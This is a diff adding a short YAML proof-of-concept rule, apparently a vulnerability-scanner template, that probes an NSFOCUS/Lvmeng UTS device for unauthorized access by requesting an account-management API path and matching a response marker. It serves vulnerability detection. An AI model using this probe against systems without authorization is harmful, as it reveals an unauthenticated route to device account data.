@@ -1,0 +1,9 @@
+name: poc-yaml-lvmeng-uts-unauthorized
+rules:
+  - method: GET
+    path: /webapi/v1/system/accountmanage/account
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"nsfocus_uts")
+detail:
+  author: MrP01ntSun(https://github.com/MrPointSun)
